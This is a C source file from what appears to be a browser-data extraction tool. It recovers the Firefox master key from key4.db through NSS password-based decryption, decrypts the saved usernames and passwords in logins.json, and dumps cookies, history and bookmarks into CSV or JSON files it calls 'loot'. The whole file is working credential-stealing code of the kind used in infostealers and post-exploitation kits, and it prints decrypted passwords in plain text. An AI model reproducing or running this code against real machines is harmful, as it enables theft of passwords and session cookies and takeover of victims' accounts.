/* bd_firefox.c - Firefox extraction: key4.db master-key recovery (NSS PBE),
 * logins.json credential decryption, cookies.sqlite, places.sqlite bookmarks
 * + history. Mirrors browser/firefox/*.go. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memset(void *, int, size_t);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);
extern int    _write(int, const void *, unsigned);

#define FF_TRACE(s) do { const char *m_ = "[T] " s "\n"; _write(2, m_, (unsigned)strlen(m_)); } while (0)

static const char *SQL_META =
    "SELECT item1, item2 FROM metaData WHERE id = 'password'";
static const char *SQL_NSS =
    "SELECT a11, a102 FROM nssPrivate";
static const char *SQL_FF_COOKIES =
    "SELECT name, COALESCE(value,''), host, path, COALESCE(creationTime,0),"
    " COALESCE(expiry,0), COALESCE(isSecure,0), COALESCE(isHttpOnly,0),"
    " COALESCE(sameSite,-1) FROM moz_cookies";
static const char *SQL_FF_HISTORY =
    "SELECT url, COALESCE(title,''), COALESCE(visit_count,0),"
    " COALESCE(last_visit_date,0) FROM moz_places";
static const char *SQL_FF_BOOKMARKS =
    "SELECT b.id, COALESCE(p.url,''), COALESCE(b.title,''),"
    " COALESCE(b.dateAdded,0), COALESCE(pt.title,'') FROM moz_bookmarks b"
    " LEFT JOIN moz_places p ON p.id = b.fk"
    " LEFT JOIN moz_bookmarks pt ON pt.id = b.parent"
    " WHERE p.url IS NOT NULL";

/* NSS key type tag (nssKeyTypeTag in masterkey.go) */
static const unsigned char NSS_TAG[16] = {
    248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1
};

typedef struct {
    unsigned char key[32];
    int keylen;         /* 32 on success */
} ff_masterkey;

/* ------------------------------------------------------------------- csv -- */
/* emitctx is replicated here in minimal form (chromium keeps the full one) */
typedef struct {
    bd_out *out;
    bd_sb   sb;
    bd_sb   staging;
    int     fmt;
    int     rows;
    const bd_browser_t *br;
    const char *profileName;
    char    filePath[700];
} ff_emit;

static void ff_emit_begin(ff_emit *e, const char *catName) {
    if (e->fmt == BD_FMT_JSON) {
        bd_sb_put(&e->sb, "{\"browser\":");
        bd_sb_json_str(&e->sb, e->br->name);
        bd_sb_put(&e->sb, ",\"profile\":");
        bd_sb_json_str(&e->sb, e->profileName);
        bd_sb_put(&e->sb, ",\"category\":");
        bd_sb_json_str(&e->sb, catName);
        bd_sb_put(&e->sb, ",\"rows\":[");
    }
}
static void ff_emit_end(ff_emit *e, const char *catName) {
    if (e->fmt == BD_FMT_JSON) bd_sb_put(&e->sb, "]}");
    if (e->out->outDir && *e->out->outDir) {
        _snprintf(e->filePath, sizeof(e->filePath), "%s\\%s_%s_%s.%s",
                  e->out->outDir, e->br->key, e->profileName, catName,
                  e->fmt == BD_FMT_JSON ? "json" : "csv");
        bd_write_file(e->filePath, e->sb.buf, e->sb.len);
    } else {
        e->filePath[0] = 0;
    }
    if (e->out->verbose && e->out->chunk && e->sb.len)
        e->out->chunk(e->out->ctx, e->sb.buf, (int)e->sb.len);
}
static void ff_row_open(ff_emit *e, int first) {
    if (e->fmt == BD_FMT_JSON) {
        if (!first) bd_sb_put(&e->sb, ",");
        bd_sb_put(&e->sb, "{");
    }
}
static void ff_row_close(ff_emit *e) {
    if (e->fmt == BD_FMT_JSON) bd_sb_put(&e->sb, "}");
    else bd_sb_put(&e->sb, "\r\n");
}
static void ff_kv(ff_emit *e, const char *k, const char *v, int first) {
    if (e->fmt == BD_FMT_JSON) {
        char kb[48];
        _snprintf(kb, sizeof(kb), "%s\"%s\":", first ? "" : ",", k);
        bd_sb_put(&e->sb, kb);
        bd_sb_json_str(&e->sb, v);
    } else {
        if (!first) bd_sb_put(&e->sb, ",");
        bd_sb_csv_field(&e->sb, v);
    }
}
static void ff_kv_num(ff_emit *e, const char *k, long long v, int first) {
    if (e->fmt == BD_FMT_JSON) {
        char b[80];
        _snprintf(b, sizeof(b), "%s\"%s\":%lld", first ? "" : ",", k, v);
        bd_sb_put(&e->sb, b);
    } else {
        char b[32];
        if (!first) bd_sb_put(&e->sb, ",");
        _snprintf(b, sizeof(b), "%lld", v);
        bd_sb_put(&e->sb, b);
    }
}
static char *ff_dupcol(const unsigned char *d, int n) {
    char *s = (char *)malloc((size_t)n + 1);
    if (!s) return NULL;
    memcpy(s, d, n); s[n] = 0;
    return s;
}

/* ------------------------------------------------------ master key (key4) -- */
static int ff_load_masterkey(const char *profileDir, const char *staging,
                             ff_masterkey *mk) {
    char p1[700];
    bd_db *db;
    unsigned char *globalSalt = NULL; size_t gsLen = 0;
    unsigned char *pwcheck = NULL; size_t pwcLen = 0;
    int got = 0;

    memset(mk, 0, sizeof(*mk));
    if (!bd_path_join(p1, sizeof(p1), profileDir, "key4.db")) return 0;
    db = bd_db_open_copy(p1, staging, NULL, 0);
    if (!db) return 0;

    if (bd_db_query(db, SQL_META) == 0 && bd_db_step(db) == 1) {
        int bl1 = 0, bl2 = 0;
        const unsigned char *i1 = bd_col_blob(db, 0, &bl1);
        const unsigned char *i2 = bd_col_blob(db, 1, &bl2);
        globalSalt = (unsigned char *)malloc((size_t)bl1 + 1);
        pwcheck = (unsigned char *)malloc((size_t)bl2 + 1);
        if (globalSalt && pwcheck) {
            memcpy(globalSalt, i1, (size_t)bl1); gsLen = (size_t)bl1;
            memcpy(pwcheck, i2, (size_t)bl2); pwcLen = (size_t)bl2;
        } else {
            if (globalSalt) { free(globalSalt); globalSalt = NULL; }
            if (pwcheck) { free(pwcheck); pwcheck = NULL; }
        }
    }
    if (!globalSalt || !pwcheck) {
        bd_db_close(db);
        if (globalSalt) free(globalSalt);
        if (pwcheck) free(pwcheck);
        return 0;
    }
    bd_db_close(db);

    /* verify password-check (metaData ASN.1 -> AES-CBC -> "password-check\2\2") */
    {
        size_t outlen = 0;
        unsigned char *pt = bd_nss_passwordcheck_pbe(pwcheck, pwcLen,
                                                     globalSalt, gsLen, &outlen);
        FF_TRACE("pwcheck decrypt done");
        if (!pt) {
            FF_TRACE("pwcheck decrypt FAILED");
            free(globalSalt); free(pwcheck);
            return 0;
        }
        FF_TRACE("pwcheck decrypt OK");
        free(pt);
    }

    /* reopen for nssPrivate */
    FF_TRACE("nss reopen");
    db = bd_db_open_copy(p1, staging, NULL, 0);
    if (!db) { FF_TRACE("nss reopen FAILED"); free(globalSalt); free(pwcheck); return 0; }
    FF_TRACE("nss db opened");
    if (bd_db_query(db, SQL_NSS) == 0) {
        FF_TRACE("nss query OK");
        for (;;) {
            int rc = bd_db_step(db);
            const unsigned char *a11, *a102;
            int l11, l102;
            size_t outlen = 0;
            unsigned char *pt;
            if (rc <= 0) { FF_TRACE("nss loop end"); break; }
            a11 = bd_col_blob(db, 0, &l11);
            a102 = bd_col_blob(db, 1, &l102);
            if (l102 != (int)sizeof(NSS_TAG) || memcmp(a102, NSS_TAG, sizeof(NSS_TAG)) != 0)
                continue;
            FF_TRACE("a11 pbes2");
            pt = bd_nss_passwordcheck_pbe(a11, (size_t)l11, globalSalt, gsLen, &outlen);
            if (!pt)   /* legacy Firefox (<144) used the 3DES privateKeyPBE */
                pt = bd_nss_private_pbe(a11, (size_t)l11, globalSalt, gsLen, &outlen);
            FF_TRACE("a11 decrypted");
            if (pt && outlen >= 24) {
                size_t take = outlen > 32 ? 32 : outlen;
                memcpy(mk->key, pt, take);
                mk->keylen = (int)take;
                free(pt);
                got = 1;
                break;
            }
            if (pt) free(pt);
        }
    }
    bd_db_close(db);
    free(globalSalt);
    free(pwcheck);
    return got;
}

/* -------------------------------------------------------------- logins.json -- */
static int ff_logins(ff_emit *e, const char *profileDir, const ff_masterkey *mk) {
    FF_TRACE("logins enter");
    char p1[700];
    char *data = NULL; size_t len = 0;
    bd_json *j;
    const bd_json *logins;
    int i, cnt, first = 1, n = 0;

    if (!bd_path_join(p1, sizeof(p1), profileDir, "logins.json")) return -1;
    if (bd_read_file(p1, &data, &len) != 0) return -1;
    j = bd_json_parse(data, len);
    free(data);
    if (!j) return -1;
    logins = bd_json_get(j, "logins");
    cnt = bd_json_is_arr(logins) ? bd_json_arr_count(logins) : 0;
    for (i = 0; i < cnt; i++) {
        const bd_json *item = bd_json_arr_at(logins, i);
        const bd_json *eu, *ep, *fu, *tu;
        const char *euser, *epass;
        unsigned char *du = NULL, *dp = NULL; size_t lu = 0, lp = 0;
        char *user = NULL, *pass = NULL, *url = NULL, *tcreated = NULL;
        char tbuf[32];
        long long created = 0;

        if (!bd_json_is_obj(item)) continue;
        eu = bd_json_get(item, "encryptedUsername");
        ep = bd_json_get(item, "encryptedPassword");
        euser = eu ? bd_json_str(eu) : NULL;
        epass = ep ? bd_json_str(ep) : NULL;
        fu = bd_json_get(item, "formSubmitURL");
        {
            const char *fs = fu ? bd_json_str(fu) : NULL;
            if (!fs || !*fs)   /* empty -> fall back to hostname */
                fu = bd_json_get(item, "hostname");
        }
        tu = bd_json_get(item, "timeCreated");
        if (tu) created = (long long)bd_json_num(tu);
        url = ff_dupcol((const unsigned char *)(fu ? bd_json_str(fu) : ""),
                        fu ? (int)strlen(bd_json_str(fu)) : 0);

        if (euser && bd_base64_decode(euser, strlen(euser), &du, &lu) == 0) {
            size_t pl = 0;
            unsigned char *pt = bd_nss_credential_pbe(du, lu, mk->key, (size_t)mk->keylen, &pl);
            if (pt) { user = (char *)pt; user[pl] = 0; }
            free(du);
        }
        if (epass && bd_base64_decode(epass, strlen(epass), &dp, &lp) == 0) {
            size_t pl = 0;
            unsigned char *pt = bd_nss_credential_pbe(dp, lp, mk->key, (size_t)mk->keylen, &pl);
            if (pt) { pass = (char *)pt; pass[pl] = 0; }
            free(dp);
        }
        bd_fmt_time(tbuf, sizeof(tbuf), created, 0);

        ff_row_open(e, first);
        ff_kv(e, "url", url ? url : "", 1);
        ff_kv(e, "username", user ? user : "", 0);
        ff_kv(e, "password", pass ? pass : "", 0);
        ff_kv(e, "created_at", tbuf, 0);
        ff_row_close(e);
        if (e->out->human && e->out->chunk) {
            char hl[700];
            int hn = _snprintf(hl, sizeof(hl), "    %s | %s | %s\r\n",
                               url ? url : "", user ? user : "", pass ? pass : "");
            if (hn > 0) e->out->chunk(e->out->ctx, hl, hn);
        }
        if (url) free(url);
        if (user) free(user);
        if (pass) free(pass);
        first = 0;
        n++;
    }
    bd_json_free(j);
    return n;
}

/* ------------------------------------------------------------------ cookies -- */
static int ff_cookies(ff_emit *e, const char *profileDir) {
    char p1[700];
    bd_db *db;
    int first = 1, n = 0;
    if (!bd_path_join(p1, sizeof(p1), profileDir, "cookies.sqlite")) return -1;
    db = bd_db_open_copy(p1, e->staging.buf, NULL, 0);
    if (!db) return -1;
    if (bd_db_query(db, SQL_FF_COOKIES) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        char *name, *val, *host, *path, t1[32], t2[32];
        long long created, expiry, secure, httponly, ss;
        if (rc <= 0) break;
        name = ff_dupcol(bd_col_text(db, 0, NULL), (int)strlen((const char *)bd_col_text(db, 0, NULL)));
        val  = ff_dupcol(bd_col_text(db, 1, NULL), (int)strlen((const char *)bd_col_text(db, 1, NULL)));
        host = ff_dupcol(bd_col_text(db, 2, NULL), (int)strlen((const char *)bd_col_text(db, 2, NULL)));
        path = ff_dupcol(bd_col_text(db, 3, NULL), (int)strlen((const char *)bd_col_text(db, 3, NULL)));
        created = bd_col_i64(db, 4);
        expiry  = bd_col_i64(db, 5);
        secure  = bd_col_i64(db, 6);
        httponly= bd_col_i64(db, 7);
        ss      = bd_col_i64(db, 8);
        bd_fmt_time(t1, sizeof(t1), created, 0);
        /* firefox expiry is unix SECONDS; convert to us for the formatter */
        bd_fmt_time(t2, sizeof(t2), expiry > 0 ? expiry * 1000000LL : 0, 0);

        ff_row_open(e, first);
        ff_kv(e, "host", host, 1);
        ff_kv(e, "path", path, 0);
        ff_kv(e, "name", name, 0);
        ff_kv(e, "value", val, 0);
        ff_kv_num(e, "is_secure", secure != 0, 0);
        ff_kv_num(e, "is_http_only", httponly != 0, 0);
        ff_kv(e, "expire_at", t2, 0);
        ff_kv(e, "created_at", t1, 0);
        ff_kv(e, "same_site", ss == 0 ? "none" : ss == 1 ? "lax" : ss == 2 ? "strict" : "unspecified", 0);
        ff_row_close(e);
        free(name); free(val); free(host); free(path);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

/* -------------------------------------------------------- history + bookmarks -- */
static int ff_history(ff_emit *e, const char *profileDir) {
    char p1[700];
    bd_db *db;
    int first = 1, n = 0;
    if (!bd_path_join(p1, sizeof(p1), profileDir, "places.sqlite")) return -1;
    db = bd_db_open_copy(p1, e->staging.buf, NULL, 0);
    if (!db) return -1;
    if (bd_db_query(db, SQL_FF_HISTORY) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        char *url, *title;
        char t[32];
        if (rc <= 0) break;
        url = ff_dupcol(bd_col_text(db, 0, NULL), (int)strlen((const char *)bd_col_text(db, 0, NULL)));
        title = ff_dupcol(bd_col_text(db, 1, NULL), (int)strlen((const char *)bd_col_text(db, 1, NULL)));
        bd_fmt_time(t, sizeof(t), bd_col_i64(db, 3), 0);
        ff_row_open(e, first);
        ff_kv(e, "url", url, 1);
        ff_kv(e, "title", title, 0);
        ff_kv_num(e, "visit_count", bd_col_i64(db, 2), 0);
        ff_kv(e, "last_visit", t, 0);
        ff_row_close(e);
        free(url); free(title);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

static int ff_bookmarks(ff_emit *e, const char *profileDir) {
    char p1[700];
    bd_db *db;
    int first = 1, n = 0;
    if (!bd_path_join(p1, sizeof(p1), profileDir, "places.sqlite")) return -1;
    db = bd_db_open_copy(p1, e->staging.buf, NULL, 0);
    if (!db) return -1;
    if (bd_db_query(db, SQL_FF_BOOKMARKS) != 0) { bd_db_close(db); return -1; }
    for (;;) {
        int rc = bd_db_step(db);
        char idb[32], *url, *title, *folder, t[32];
        if (rc <= 0) break;
        _snprintf(idb, sizeof(idb), "%lld", bd_col_i64(db, 0));
        url = ff_dupcol(bd_col_text(db, 1, NULL), (int)strlen((const char *)bd_col_text(db, 1, NULL)));
        title = ff_dupcol(bd_col_text(db, 2, NULL), (int)strlen((const char *)bd_col_text(db, 2, NULL)));
        folder = ff_dupcol(bd_col_text(db, 4, NULL), (int)strlen((const char *)bd_col_text(db, 4, NULL)));
        bd_fmt_time(t, sizeof(t), bd_col_i64(db, 3), 0);
        ff_row_open(e, first);
        ff_kv(e, "id", idb, 1);
        ff_kv(e, "name", title, 0);
        ff_kv(e, "type", "url", 0);
        ff_kv(e, "url", url, 0);
        ff_kv(e, "folder", folder, 0);
        ff_kv(e, "created_at", t, 0);
        ff_row_close(e);
        free(url); free(title); free(folder);
        first = 0; n++;
    }
    bd_db_close(db);
    return n;
}

/* ---------------------------------------------------------------- driver -- */
static int ff_file_exists(const char *dir, const char *rel, char *out, size_t cap) {
    DWORD a;
    if (!bd_path_join(out, cap, dir, rel)) return 0;
    a = GetFileAttributesA(out);
    return (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY));
}

static int ff_profile_cb(void *vctx, const char *profileDir);

typedef struct {
    const bd_browser_t *br;
    int   catMask;
    bd_out *out;
    int  *files;
} ffctx;

static int ff_profile_run(const bd_browser_t *br, const char *profileDir,
                          int catMask, bd_out *out, int *files) {
    ff_emit e;
    const char *profName = bd_path_name(profileDir);
    char stagingDir[700];
    ff_masterkey mk;
    int haveMk = 0, cat;

    memset(&e, 0, sizeof(e));
    e.out = out; e.fmt = out->fmt; e.br = br; e.profileName = profName;
    bd_sb_init(&e.sb);
    if (out->outDir && *out->outDir)
        _snprintf(stagingDir, sizeof(stagingDir), "%s\\staging_%s_%s",
                  out->outDir, br->key, profName);
    else {
        char *t = bd_temp_dir();
        if (t) {
            _snprintf(stagingDir, sizeof(stagingDir), "%s\\stage_%s_%s",
                      t, br->key, profName);
            free(t);
        } else {
            stagingDir[0] = 0;
        }
    }
    bd_mkdir(stagingDir);
    bd_sb_init(&e.staging);
    bd_sb_put(&e.staging, stagingDir);

    for (cat = 1; cat <= BD_CAT_ALL; cat <<= 1) {
        int n = -1;
        char p1[700];
        if (!(catMask & cat)) continue;
        switch (cat) {
        case BD_CAT_PASSWORDS:
            if (ff_file_exists(profileDir, "logins.json", p1, sizeof(p1)) &&
                ff_file_exists(profileDir, "key4.db", p1, sizeof(p1))) {
                haveMk = ff_load_masterkey(profileDir, stagingDir, &mk);
                if (!haveMk) {
                    if (out->logf)
                        out->logf(out->ctx, "[-] firefox/%s: key4.db master key not recovered (master password set?)", profName);
                } else {
                    ff_emit_begin(&e, "passwords");
                    if (e.fmt == BD_FMT_CSV)
                        bd_sb_put(&e.sb, "url,username,password,created_at,store\r\n");
                    n = ff_logins(&e, profileDir, &mk);
                    ff_emit_end(&e, "passwords");
                }
            }
            break;
        case BD_CAT_COOKIES:
            if (ff_file_exists(profileDir, "cookies.sqlite", p1, sizeof(p1))) {
                ff_emit_begin(&e, "cookies");
                if (e.fmt == BD_FMT_CSV)
                    bd_sb_put(&e.sb, "host,path,name,value,is_secure,is_http_only,expire_at,created_at,same_site\r\n");
                n = ff_cookies(&e, profileDir);
                ff_emit_end(&e, "cookies");
            }
            break;
        case BD_CAT_HISTORY:
            if (ff_file_exists(profileDir, "places.sqlite", p1, sizeof(p1))) {
                ff_emit_begin(&e, "history");
                if (e.fmt == BD_FMT_CSV)
                    bd_sb_put(&e.sb, "url,title,visit_count,last_visit\r\n");
                n = ff_history(&e, profileDir);
                ff_emit_end(&e, "history");
            }
            break;
        case BD_CAT_DOWNLOADS:
            if (ff_file_exists(profileDir, "places.sqlite", p1, sizeof(p1))) {
                ff_emit_begin(&e, "downloads");
                if (e.fmt == BD_FMT_CSV)
                    bd_sb_put(&e.sb, "url,target_path,mime_type,total_bytes,start_time,end_time\r\n");
                n = -1;  /* moz_annos schema varies; phase 2 */
                ff_emit_end(&e, "downloads");
                if (e.sb.len) { /* nothing emitted beyond possible header */
                }
                /* avoid writing an empty loot file for unsupported cat */
                DeleteFileA(e.filePath);
                e.sb.len = 0; if (e.sb.buf) e.sb.buf[0] = 0;
            }
            break;
        case BD_CAT_BOOKMARKS:
            if (ff_file_exists(profileDir, "places.sqlite", p1, sizeof(p1))) {
                ff_emit_begin(&e, "bookmarks");
                if (e.fmt == BD_FMT_CSV)
                    bd_sb_put(&e.sb, "id,name,type,url,folder,created_at\r\n");
                n = ff_bookmarks(&e, profileDir);
                ff_emit_end(&e, "bookmarks");
            }
            break;
        default:
            continue;
        }
        if (n > 0) {
            (*files)++;
            if (out->logf) {
                if (e.filePath[0])
                    out->logf(out->ctx, "[+] Firefox/%s %s: %d rows -> %s",
                              profName, bd_cat_name(cat), n, e.filePath);
                else
                    out->logf(out->ctx, "[+] Firefox/%s %s: %d rows",
                              profName, bd_cat_name(cat), n);
            }
        } else if (n < 0 && out->logf) {
            out->logf(out->ctx, "[-] Firefox/%s %s: not available",
                      profName, bd_cat_name(cat));
        }
        e.sb.len = 0;
        if (e.sb.buf) e.sb.buf[0] = 0;
    }
    if (stagingDir[0]) bd_rmdir(stagingDir);   /* staging DB copies already gone */
    bd_sb_free(&e.sb);
    bd_sb_free(&e.staging);
    return 0;
}

static int ff_profile_cb(void *vctx, const char *profileDir) {
    ffctx *c = (ffctx *)vctx;
    ff_profile_run(c->br, profileDir, c->catMask, c->out, c->files);
    return 1;
}

int bd_firefox_extract(const bd_browser_t *br, const char *profileDir,
                       int catMask, bd_out *out, int *files) {
    ffctx c;
    c.br = br; c.catMask = catMask; c.out = out; c.files = files;
    ff_profile_run(br, profileDir, catMask, out, files);
    return 0;
}

void bd_firefox_for_profiles(const bd_browser_t *br, int catMask,
                             bd_out *out, int *files) {
    ffctx c;
    c.br = br; c.catMask = catMask; c.out = out; c.files = files;
    bd_for_each_profile(br, ff_profile_cb, &c);
}
